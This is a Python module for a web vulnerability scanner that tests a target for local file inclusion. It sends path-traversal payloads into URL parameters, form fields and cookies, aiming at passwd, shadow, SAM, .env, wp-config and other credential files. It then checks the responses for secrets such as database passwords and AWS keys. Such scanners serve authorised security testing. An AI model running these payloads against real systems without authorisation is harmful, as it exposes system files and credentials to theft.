#!/usr/bin/env python3
"""
LFI (Local File Inclusion) Scanner Module
Author: SayerLinux
"""

import re
import requests
import os
import time
from typing import List, Dict, Any
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse


class LFIScanner:
    """Local File Inclusion vulnerability scanner"""
    
    def __init__(self, config):
        self.config = config
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': config.get('user_agent')})
        
        # Load LFI payloads
        self.payloads = self._load_payloads()
        
        # Setup timeout and retries
        self.timeout = config.get('timeout', 30)
        self.retries = config.get('retries', 3)
    
    def _load_payloads(self) -> List[str]:
        """Load LFI payloads from file or use defaults"""
        payload_file = self.config.get('payloads.lfi_payloads_file')
        
        if payload_file and os.path.exists(payload_file):
            with open(payload_file, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        
        # Default LFI payloads
        return [
            '../../../etc/passwd',
            '../../etc/passwd',
            '../etc/passwd',
            '../../../etc/hosts',
            '../../etc/hosts',
            '../etc/hosts',
            '../../../windows/system32/drivers/etc/hosts',
            '../../windows/system32/drivers/etc/hosts',
            '../windows/system32/drivers/etc/hosts',
            '../../../windows/win.ini',
            '../../windows/win.ini',
            '../windows/win.ini',
            '../../../boot.ini',
            '../../boot.ini',
            '../boot.ini',
            '../../../windows/system32/config/sam',
            '../../windows/system32/config/sam',
            '../windows/system32/config/sam',
            '../../../etc/shadow',
            '../../etc/shadow',
            '../etc/shadow',
            '../../../etc/group',
            '../../etc/group',
            '../etc/group',
            '../../../proc/version',
            '../../proc/version',
            '../proc/version',
            '../../../proc/cmdline',
            '../../proc/cmdline',
            '../proc/cmdline',
            '../../../proc/self/environ',
            '../../proc/self/environ',
            '../proc/self/environ',
            '../../../proc/self/cmdline',
            '../../proc/self/cmdline',
            '../proc/self/cmdline',
            '../../../proc/1/environ',
            '../../proc/1/environ',
            '../proc/1/environ',
            '../../../var/log/apache/access.log',
            '../../var/log/apache/access.log',
            '../var/log/apache/access.log',
            '../../../var/log/apache2/access.log',
            '../../var/log/apache2/access.log',
            '../var/log/apache2/access.log',
            '../../../var/log/nginx/access.log',
            '../../var/log/nginx/access.log',
            '../var/log/nginx/access.log',
            '../../../var/log/httpd/access.log',
            '../../var/log/httpd/access.log',
            '../var/log/httpd/access.log',
            '../../../var/www/html/config.php',
            '../../var/www/html/config.php',
            '../var/www/html/config.php',
            '../../../var/www/html/wp-config.php',
            '../../var/www/html/wp-config.php',
            '../var/www/html/wp-config.php',
            '../../../var/www/html/configuration.php',
            '../../var/www/html/configuration.php',
            '../var/www/html/configuration.php',
            '../../../var/www/.env',
            '../../var/www/.env',
            '../var/www/.env',
            '../../../.env',
            '../../.env',
            '../.env',
            '../../../config.php',
            '../../config.php',
            '../config.php',
            '../../../config/database.yml',
            '../../config/database.yml',
            '../config/database.yml',
            '../../../config/database.php',
            '../../config/database.php',
            '../config/database.php',
            '../../../app/config/database.yml',
            '../../app/config/database.yml',
            '../app/config/database.yml',
            '../../../application/config/database.php',
            '../../application/config/database.php',
            '../application/config/database.php',
            '../../../config/production/database.yml',
            '../../config/production/database.yml',
            '../config/production/database.yml',
            '../../../config/development/database.yml',
            '../../config/development/database.yml',
            '../config/development/database.yml',
            '../../../config/settings.yml',
            '../../config/settings.yml',
            '../config/settings.yml',
            '../../../config/application.yml',
            '../../config/application.yml',
            '../config/application.yml',
            '../../../config/secrets.yml',
            '../../config/secrets.yml',
            '../config/secrets.yml',
            '../../../.htaccess',
            '../../.htaccess',
            '../.htaccess',
            '../../../web.config',
            '../../web.config',
            '../web.config',
            '../../../robots.txt',
            '../../robots.txt',
            '../robots.txt',
            '../../../sitemap.xml',
            '../../sitemap.xml',
            '../sitemap.xml'
        ]
    
    def scan(self, target: str) -> List[Dict[str, Any]]:
        """Scan target for LFI vulnerabilities"""
        vulnerabilities = []
        
        try:
            # Get initial response to find forms and parameters
            response = self.session.get(target, timeout=self.timeout)
            
            # Scan URL parameters
            url_vulns = self._scan_url_parameters(target)
            vulnerabilities.extend(url_vulns)
            
            # Scan forms
            form_vulns = self._scan_forms(target, response.text)
            vulnerabilities.extend(form_vulns)
            
            # Scan cookies
            cookie_vulns = self._scan_cookies(target)
            vulnerabilities.extend(cookie_vulns)
            
        except Exception as e:
            print(f"Error in LFI scan: {str(e)}")
        
        return vulnerabilities
    
    def _scan_url_parameters(self, url: str) -> List[Dict[str, Any]]:
        """Scan URL parameters for LFI"""
        vulnerabilities = []
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        for param_name in params.keys():
            for payload in self.payloads:
                try:
                    # Create test URL with payload
                    new_params = params.copy()
                    new_params[param_name] = [payload]
                    
                    new_query = urlencode(new_params, doseq=True)
                    test_url = urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, new_query, parsed.fragment
                    ))
                    
                    response = self.session.get(test_url, timeout=self.timeout)
                    
                    if self._detect_lfi(response, payload):
                        vulnerabilities.append({
                            'type': 'LFI',
                            'subtype': 'Local File Inclusion',
                            'severity': 'high',
                            'description': f'LFI vulnerability in URL parameter: {param_name}',
                            'parameter': param_name,
                            'payload': payload,
                            'url': test_url,
                            'evidence': response.text[:200] + '...' if len(response.text) > 200 else response.text
                        })
                    
                    time.sleep(self.config.get('delay', 0))
                    
                except Exception as e:
                    continue
        
        return vulnerabilities
    
    def _scan_forms(self, url: str, html_content: str) -> List[Dict[str, Any]]:
        """Scan forms for LFI vulnerabilities"""
        vulnerabilities = []
        
        try:
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(html_content, 'html.parser')
            forms = soup.find_all('form')
            
            for form in forms:
                form_action = form.get('action', '')
                form_method = form.get('method', 'get').lower()
                inputs = form.find_all(['input', 'textarea', 'select'])
                
                form_url = urljoin(url, form_action)
                
                for input_tag in inputs:
                    input_name = input_tag.get('name')
                    if not input_name:
                        continue
                    
                    input_type = input_tag.get('type', 'text')
                    if input_type.lower() in ['submit', 'button', 'hidden']:
                        continue
                    
                    for payload in self.payloads:
                        try:
                            form_data = {}
                            for inp in inputs:
                                name = inp.get('name')
                                if name:
                                    if name == input_name:
                                        form_data[name] = payload
                                    else:
                                        form_data[name] = inp.get('value', 'test')
                            
                            if form_method == 'post':
                                response = self.session.post(form_url, data=form_data, timeout=self.timeout)
                            else:
                                response = self.session.get(form_url, params=form_data, timeout=self.timeout)
                            
                            if self._detect_lfi(response, payload):
                                vulnerabilities.append({
                                    'type': 'LFI',
                                    'subtype': 'Local File Inclusion',
                                    'severity': 'high',
                                    'description': f'LFI vulnerability in form input: {input_name}',
                                    'form_action': form_action,
                                    'form_method': form_method,
                                    'input_name': input_name,
                                    'payload': payload,
                                    'url': form_url,
                                    'evidence': response.text[:200] + '...' if len(response.text) > 200 else response.text
                                })
                            
                            time.sleep(self.config.get('delay', 0))
                            
                        except Exception as e:
                            continue
        
        except Exception as e:
            print(f"Error scanning forms: {str(e)}")
        
        return vulnerabilities
    
    def _scan_cookies(self, url: str) -> List[Dict[str, Any]]:
        """Scan cookies for LFI vulnerabilities"""
        vulnerabilities = []
        
        try:
            response = self.session.get(url, timeout=self.timeout)
            
            # Get cookies from response
            cookies = response.cookies
            
            for cookie_name in cookies.keys():
                for payload in self.payloads:
                    try:
                        # Create new session with modified cookie
                        temp_session = requests.Session()
                        temp_session.headers.update({'User-Agent': self.config.get('user_agent')})
                        temp_session.cookies.set(cookie_name, payload)
                        
                        response = temp_session.get(url, timeout=self.timeout)
                        
                        if self._detect_lfi(response, payload):
                            vulnerabilities.append({
                                'type': 'LFI',
                                'subtype': 'Cookie-based LFI',
                                'severity': 'high',
                                'description': f'LFI vulnerability in cookie: {cookie_name}',
                                'cookie_name': cookie_name,
                                'payload': payload,
                                'url': url,
                                'evidence': response.text[:200] + '...' if len(response.text) > 200 else response.text
                            })
                        
                        time.sleep(self.config.get('delay', 0))
                        
                    except Exception as e:
                        continue
        
        except Exception as e:
            print(f"Error scanning cookies: {str(e)}")
        
        return vulnerabilities
    
    def _detect_lfi(self, response: requests.Response, payload: str) -> bool:
        """Detect if LFI payload was successful"""
        try:
            content_type = response.headers.get('content-type', '').lower()
            if 'text/html' not in content_type and 'text/plain' not in content_type:
                return False
            
            # Check for file content indicators
            file_indicators = [
                # Linux/Unix files
                'root:x:0:0:root:/root:/bin/bash',
                'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin',
                'bin:x:2:2:bin:/bin:/usr/sbin/nologin',
                'sys:x:3:3:sys:/dev:/usr/sbin/nologin',
                '127.0.0.1 localhost',
                '::1 localhost',
                'root:*:',
                'daemon:*:',
                'bin:*:',
                'sys:*:',
                'proc/version',
                'Linux version',
                
                # Windows files
                '[boot loader]',
                '[operating systems]',
                '[fonts]',
                '[extensions]',
                '[mci extensions]',
                '[files]',
                '[mail]',
                '[MCI Extensions]',
                '[files]',
                '[Mail]',
                '[MCI Extensions BAK]',
                'Windows Registry Editor Version 5.00',
                'REGEDIT4',
                
                # Configuration files
                '<?php',
                '<?=',
                '<?xml',
                '<?xml version=',
                '<configuration>',
                '<appSettings>',
                '<connectionStrings>',
                '<database>',
                '<settings>',
                'DB_HOST=',
                'DB_USER=',
                'DB_PASSWORD=',
                'DATABASE_URL=',
                'SECRET_KEY=',
                'API_KEY=',
                'AWS_ACCESS_KEY_ID=',
                'AWS_SECRET_ACCESS_KEY='
            ]
            
            for indicator in file_indicators:
                if indicator in response.text:
                    return True
            
            return False
            
        except Exception as e:
            return False